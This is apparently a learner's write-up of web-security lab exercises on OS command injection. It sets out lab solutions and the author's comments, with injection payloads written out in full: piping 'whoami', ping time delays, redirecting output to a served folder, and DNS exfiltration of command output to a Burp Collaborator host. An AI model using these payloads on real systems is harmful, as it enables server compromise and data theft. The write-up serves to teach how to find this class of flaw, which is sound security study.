# OS command injection

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.

## Useful commands

| Purpose of command      | Linux         | Windows         |
| ----------------------- |---------------|-----------------|
| Name of current user    | whoami        | whoami          |
| Operating system        | uname -a      | ver             |
| Network configuration   | ifconfig      | ipconfig /all   |
| Network connections     | netstat -an   | netstat -an     |
| Running processes       | ps -ef        | tasklist        | 

### OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.
The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

**Solution**
1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the *storeID* parameter, giving it the *value 1|whoami*.
3. Observe that the response contains the *name* of the current user.

**My comment**

Write this to determine the name of the current user

```productId=1&storeId=1|whoami```

## Blind OS command injection vulnerabilities

The application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

### Blind OS command injection with time delays

This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

**Solution**
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:

    ```email=x||ping+-c+10+127.0.0.1||```
3. Observe that the response takes 10 seconds to return.

**My comment**

This command will cause the application to ping its loopback network adapter for 10 seconds.

```||ping+-c+10+127.0.0.1||```

```csrf=g2SpqZfZMT0DNRB6KSaoZ41Eb6xW9JK5&name=Hacker&email=hacker%40hackit.com||ping+-c+10+127.0.0.1||&subject=Try It&message=-_-q```

### Blind OS command injection with output redirection

This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

```/var/www/images/```

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

**Solution**
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the *email* parameter, changing it to:

    ```email=||whoami>/var/www/images/output.txt||```

3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the *filename* parameter, changing the value to the name of the file you specified for the output of the injected command:

    ```filename=output.txt```

5. Observe that the response contains the output from the injected command.

**My comment**

```||whoami>/var/www/images/output.txt||```

```csrf=l2KUXpDUC1F1AfkvW7bEMBX44zivWxCQ&name=Hacker&email=hacker%40hackit.com||whoami>/var/www/images/output.txt||&subject=fck4&message=Hello+my+old+friend!```

Then change a filename 

```GET /image?filename=output.txt HTTP/1.1```

### Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

**Solution**
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the *email* parameter, changing it to:

    ```email=x||nslookup+x.burpcollaborator.net||```

**My comment**

Write and use burp collaborator

```||nslookup+burpcollaborator.net||```

```csrf=hySwVEki7X1Ap2COirbua4zKPosdalXO&name=Hacker&email=hacker%40hackit.com||nslookup+&subject=Smile&message=%3A%29```

### Blind OS command injection with out-of-band data exfiltration

This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

**Solution**
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the *email* parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:

    ```email=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||```

5. Go back to the Burp Collaborator client window, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.